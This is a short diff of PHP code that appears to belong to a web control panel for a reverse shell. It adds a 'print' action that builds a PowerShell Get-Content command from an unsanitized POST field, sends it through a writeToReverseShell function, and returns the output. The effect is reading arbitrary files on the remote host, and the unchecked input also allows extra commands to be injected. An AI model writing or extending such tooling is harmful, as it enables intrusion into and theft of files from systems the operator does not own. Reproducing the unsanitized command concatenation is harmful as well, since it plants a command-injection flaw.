@@ -170,6 +170,10 @@ if (isset($_POST['action'])) {
         break;
 
         case "print":
+            error_log("Received print action");
+            $cmd = "Get-Content -Path " . $_POST['command'] . " -Encoding UTF8";
+            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
+            echo substr($result, 0, strrpos($result, "\n"));
         break;
         
         case "init":
